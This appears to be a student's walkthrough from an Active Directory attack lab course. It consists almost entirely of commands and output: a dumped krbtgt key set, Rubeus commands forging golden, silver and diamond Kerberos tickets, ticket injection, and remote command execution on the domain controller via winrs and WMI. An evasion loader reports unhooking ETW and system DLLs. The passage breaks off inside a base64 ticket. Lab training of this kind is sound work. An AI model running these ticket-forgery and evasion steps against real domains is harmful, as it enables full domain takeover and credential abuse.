    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd
```

### Forging Golden Ticket using Rubeus
**On the new cmd session**

* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd**
```
[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 9/23/2025 11:07:34 AM
[*] StartTime      : 9/23/2025 11:07:34 AM
[*] EndTime        : 9/23/2025 9:07:34 PM
[*] RenewTill      : 9/30/2025 11:07:34 AM

[*] base64(ticket.kirbi):

      doIGJDCCBiCgAwIBBaEDAgEWooIE3jCCBNphggTWMIIE0qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      BHowggR2oAMCARKhAwIBA6KCBGgEggRkPEyb1nzkSbPT7eTyPsWO/vG4BPOG/NIl8zwVE7Evt47oC18S
      Hnj5aXp+1txltVwLTWU6iSabNj/2zHPEG8na91Q1+3xlwf8SmmDilpDDzYo9k9au3s57FfYFk9ZZq4Mp
      y4M3QVQ5NWvqX/1r2FPK3tN8fdKDKVaJ4LFbxKjvguHPGyJ34vAqVi9HFkCoD4iibh6YywZE8MAY/L2H
      yk1fQSfz+P9BciQBCEnssP6cXusZPjbEoblilaOt/WXWubX/+DVuH5MYnX4EITuZuEtgbhEycI+gIYBX
      AkzJ9fCyu7p4kLhccPeY1oJlo8zTumceOON523BGLbsq2RcxuArggeZfQGz7hLgKLZjI6rAG9I3Bf5aT
      jJWybVA5iCOo4n4Ybg6fW8unWwZb/FxSuZ5VfRklWMb/YixYnyhwkj2G4qd9goa9psqRmubiUwuqxJ64
      2Qi+G0GrMAzrpCZWcH3wOU6dMYNcXR3s9l/PMFXhsh0WIgxxiM4+VIHCIYZ/tN/S7q+ucEUwwSP2at9W
      QVHrfeNyViJB9fgvkrlwZcJYjIz5jbh2Ov00KYiAJexW1VU1bhHEIMQE3eszPkfohc1NL39v4JO1Y0F7
      NyNNLqmZlIKMzkW54o1xT8BqXkIhIaH7ceIAKVgmfYtjGlN7sc3/v6yVRJbtTAfjScGd42oDQ/5IEyiP
      cABKWQW4qK2lJVzknsJg0iLdQQzGa1zGFK4hI4m4sjef7G/NPgY2+TB/IoKW+te4ymfP0Npu2Szsy9T8
      ZA2FxMndVpnLMjExeYkBtsllZGM1g64MAZiKwAbg8mTXZOf1MUgFEpdT/l7fI9SgolbkZs6olAX1kWNX
      J1H89M+H8TRjbyM/MOv//VJ8dWOkGkMdV4KRglztsLHmNpFhyDTsch73eE5VjMttF69W+THRaA8Z8tSD
      dpai4sEDNHIw7Lre355zyx8B1rAmG0O5yZuC6K8BnI3xH+aUZNXv5ohm9cm0M2QZbpVm37wrRS0yBav2
      SlBdgLeHG6dXRvJCQByRQO8Iun62o9+SK/j5LDa4oWdm8xtnu0mH9J96/NAoZ36dgIXj76VTWuTCOeSU
      qouNCFVRI552+Z+Tr5CVzi4QZxq65pUpgw8u862OjYsOtRBMGPA7TUtS1UVT9oWb4kseseAnF9AjYMBJ
      0tAFa8D8UNxltYrtBHH0P50mMeqoHDq0nMBtPGi1zDmpx2J/4gUEnY/bQWGi6zWmKmrVzxlpRkqeTdP5
      IKtfeSDBkp86bZYEQDkGigUPhlOCn6mOl593qvLTT4xP/JQ4CFm5vViUxPHn9DybxoEjpcdRTnHmfVkx
      jJ5hDwdmyZXUteXu9Eqc2hsi2QjUiDb/EGU2PFgKHBmDsJz7zHojVSR75UZUzZdD4A1rGG3iPixygsKe
      zE7wOmlR3OpUI8aAMSReYc8/7LUpAgLud1ycnem9+aqpzQgfdYeGdChSKZz/kdliY0VMKpfrTKJLP2jD
      b0vmF7Hc5umjggEwMIIBLKADAgEAooIBIwSCAR99ggEbMIIBF6CCARMwggEPMIIBC6ArMCmgAwIBEqEi
      BCA0R7bTO0SNfl1jImmTzrLvsfRE3DAxaaAWDtiwgO7aiaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5M
      T0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDgAACkERgPMjAyNTA5MjMxODA3MzRa
      pREYDzIwMjUwOTIzMTgwNzM0WqYRGA8yMDI1MDkyNDA0MDczNFqnERgPMjAyNTA5MzAxODA3MzRaqBwb
      GkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3Jw
      Lm1vbmV5Y29ycC5sb2NhbA==

[*] Printing a command to recreate a ticket containing the information used within this ticket
```

### use the generated command to forge a Golden ticket. Remember to add "-path C:\AD\Tools\Rubeus.exe -args" after Loader.exe and /ptt at the end of the generated command to inject it in the current process. 

### Once the ticket is injected.

* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt**

```
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 9/23/2025 11:13:17 AM
[*] StartTime      : 9/23/2025 11:13:17 AM
[*] EndTime        : 9/23/2025 9:13:17 PM
[*] RenewTill      : 9/30/2025 11:13:17 AM

[*] base64(ticket.kirbi):

      doIGJDCCBiCgAwIBBaEDAgEWooIE3jCCBNphggTWMIIE0qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      BHowggR2oAMCARKhAwIBA6KCBGgEggRkUKvIHL9lmUan+U5k35Jacr6Of1nDx0E0EYE71N9/yl7DLkTg
      tvfUzCFPgFe41dq8KNYnR6S2VXLn+ygl74qfWYogrL8p0FBUOzuJNNW/LK1usGdy1v7KLj3hOLBFbaSt
      k9C28kvSDCMma1yBeLBOZs679wGxB/SGP9AFNuWt0jm5qhUfGDM1m+eBEJF3MYju/YBTN+LFIaiLszJ3
      grZu4xb++37pdJBJFk9kmT2i0/6c+32ckzz6rtp2x9OigFMJd20SiYPBA/nj8yr8oyJ5TQ7Rayjy3EJ+
      hee42i8L82Etp+muiTTgEGxTAyDHjXxAM+D93XSHZ1qOSxNscbCsjf4eM1NIHheM7QfyXsb0E9MhLRuq
      di0oIUWlw7z/YN0DQnAcACc15Z4nc89aKgnvaoU2dUV+pmilpAeNzow0DFFjPpUfZKFPXvIeR1O9bzgA
      pfQIcZIrojpJYPyFnUrZ1BGRGmbjiXF101BvvpqBPCSezW1r9hFgWieFL39jYURHA/n1kR1EZfBBkHQ5
      eQkxQYFFRC0vFm2p0p7EEAS8ioIIQ+trPkPhoUSZloQ3lFC8iVxR8U/l7u3R0yOkzak5d0WL3ruuHERY
      y7UNNX0110hKSQ2u+5Vuo0l/GtsLB2qNejRjrIYErvkSfMeO8OJtknbbIdvHnUki+/dCsEZtW5EBR6vu
      HmucCy0C90yk41fGM+TFVWPUnrXQpE45L7W5FC1VkqVuGG/odk8YXAhv3HHS5qRHDhdq8DcODQkISusk
      zgMKgPKKZEQ2DU7dCKH04YSTZ9ZxpAVKqqh11kq9UI/5VJyFpSfzHqiRH3n457rumbNLeyTn4UyqXajZ
      bGMdUd8GevJcPq7NommVqGSbvmDBgT8FVaQsalv/LDZu3jkfOimeZy84DtaLnRQJArSNwmVRUHRAL8tc
      y2X3dVgJh8GJnjm09rdn4Wa+yX4bzRnDCAH+KfIEAWLA+1Xym1bDM2d5jOh53hXxLiWghtWEjVVBdrpW
      +pM7POL6Bl0gqPrPSgl9VN3M7fQ0Vm7QoCFsxapkrn9QYfA8dvKi9cQy4w4yDTvkAADNLMLPDuf0mw1i
      v7is34D2nai0vmvOgw1Wwh/4IQPtdRml4DfP1gAYvvNSoLrSDHLZ4+Zas7kAB0ibSDf2TjEHRD5nmsIh
      MyOYo7MFHoai8hwcy7VjXhPu432h06+M54l57UNmOAvByY+8YsW+rMCwgQlueTghQ/Okna+BtGtQEnAx
      O11VtgaeyVnwHqOzlzfmkijtdeMuqWvKxmSEDh4NsuB0EcvgdxXVWb0IDs71FY/s+vT90d2awz34OPu+
      VC/wF4ASo67TibjOc3IfLnz3A+qEVlBBMairOauYJs65WKNnWH9yjVdULM4MNcETMSef+4UKQwbCJyWC
      +Hm17gDSn4bFnMi5iRxv4rM2zTBLIxcsZusAGDKytLq6Z/BIHMoN+c/dDJV2+ffNTen/LcpUxsa5QQOO
      21SBGZVzb/ajggEwMIIBLKADAgEAooIBIwSCAR99ggEbMIIBF6CCARMwggEPMIIBC6ArMCmgAwIBEqEi
      BCC2lFwBQxV26YR1Y4axzQd/m9C1vVgHUM97FFjrDq5JK6EcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5M
      T0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDgAACkERgPMjAyNTA5MjMxODEzMTda
      pREYDzIwMjUwOTIzMTgxMzE3WqYRGA8yMDI1MDkyNDA0MTMxN1qnERgPMjAyNTA5MzAxODEzMTdaqBwb
      GkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3Jw
      Lm1vbmV5Y29ycC5sb2NhbA==

[+] Ticket successfully imported!
```

* C:\Users\student731> **klist**
```
Current LogonId is 0:0x44a667

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 9/23/2025 11:13:17 (local)
        End Time:   9/23/2025 21:13:17 (local)
        Renew Time: 9/30/2025 11:13:17 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```


## Learning Objective 9:
```
• Try to get command execution on the domain controller by creating silver ticket for:
− HTTP
− WMI
```

### we have the hash for the machine account of the domain controller (dcorp-dc$). 
### we can create a Silver Ticket that provides us access to the HTTP service (WinRM) on DC

* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:a98e18228819e8eec3dfa33cb68b0728 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt**

```
[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ServiceKey     : A98E18228819E8EEC3DFA33CB68B0728
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : A98E18228819E8EEC3DFA33CB68B0728
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : http
[*] Target         : dcorp-dc.dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGS for 'Administrator' to 'http/dcorp-dc.dollarcorp.moneycorp.local'

[*] AuthTime       : 9/23/2025 11:59:23 AM
[*] StartTime      : 9/23/2025 11:59:23 AM
[*] EndTime        : 9/23/2025 9:59:23 PM
[*] RenewTill      : 9/30/2025 11:59:23 AM

[*] base64(ticket.kirbi):

      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
      cnAubW9uZXljb3JwLmxvY2Fs

[+] Ticket successfully imported!
```

### We can check if we got the correct service ticket:

* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist**
```

    [1] - 0x17 - rc4_hmac
      Start/End/MaxRenew: 9/23/2025 11:59:23 AM ; 9/23/2025 9:59:23 PM ; 9/30/2025 11:59:23 AM
      Server Name       : http/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
      Client Name       : Administrator @ DOLLARCORP.MONEYCORP.LOCAL
      Flags             : pre_authent, renewable, forwardable (40a00000)
```

### We have the HTTP service ticket for dcorp-dc, let’s try accessing it using winrs. Note that we are using FQDN of dcorp-dc as that is what the service ticket has

* C:\AD\Tools> **winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd**
```
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.
```

* C:\Users\Administrator> **set computername**
```
set computername
COMPUTERNAME=DCORP-DC
```

* C:\Users\Administrator> **set username**
```
set username
USERNAME=Administrator
```

### WMI Service
### For accessing WMI, we need to create two tickets - one for HOST service and another for RPCSS. 

### Run the below commands from other an elevated shell

[!IMPORTANT]
* The value of rc4 is the same of srvadmin, in this case (a98e18228819e8eec3dfa33cb68b0728)

* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:a98e18228819e8eec3dfa33cb68b0728 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt**

### Inject a ticket for RPCSS

* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:a98e18228819e8eec3dfa33cb68b0728 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt**

### Check if the tickets are present
* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist**
* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist | findstr "rpcss"**
* C:\Users\student731> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist | findstr "host"**

```
Server Name       : rpcss/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
Server Name       : host/dcorp-std731.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
Server Name       : host/dcorp-dc.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
```

### Now, try running WMI commands on the domain controller
* C:\Windows\system32> **C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat**
* PS C:\Windows\system32> **Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc**
```
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

### Learning Objective 10:
```
• Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack
```

* C:\Windows\system32> **C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 / createnetonly:C:\Windows\System32\cmd.exe /show /ptt**

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 / createnetonly:C:\Windows\System32\cmd.exe /show /ptt
[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dcorp-dc.dollarcorp.moneycorp.local'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: x0ihiLFNpCqQ83Le31LRxHUcSSrz4pXaWnp/Q7d+zeY=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      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

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIF9jCCBfKgAwIBBaEDAgEWooIExjCCBMJhggS+MIIEuqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOC
      BGIwggReoAMCARKhAwIBA6KCBFAEggRMnEvhFNFoNs2H4Npx/B/uujd+MTYj5IE6+D79Hb/uUculj4UE
      A8wmrGFppUJmkSMIxRLHuZ0EYk0xm3kODnBDT6f3z8IWgDD2XdpOOzlAt0GviCgSTraMiWMykSRx5olV
      ESdo31fQO3XHlsegcE5/qG61NLQfNnRb55zV0urvbG2HH3/YTTunuPryQ4MbdRJ+8rrvGpnuD4Xzep05
